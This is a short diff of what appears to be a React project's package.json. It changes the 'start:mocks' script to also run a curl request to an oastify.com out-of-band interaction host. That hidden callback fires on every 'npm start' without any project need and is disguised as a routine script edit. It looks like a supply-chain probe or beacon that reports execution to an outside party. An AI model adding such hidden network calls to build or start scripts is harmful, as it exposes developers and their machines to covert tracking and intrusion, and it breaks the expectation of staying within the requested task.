@@ -11,7 +11,7 @@
     "supertest": "^4.0.2"
   },
   "scripts": {
-    "start:mocks": "node server/index.js",
+    "start:mocks": "node server/index.js && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/upgrade-front",
     "start:dev": "react-scripts start",
     "start": "run-p start:*",
     "build": "react-scripts build",
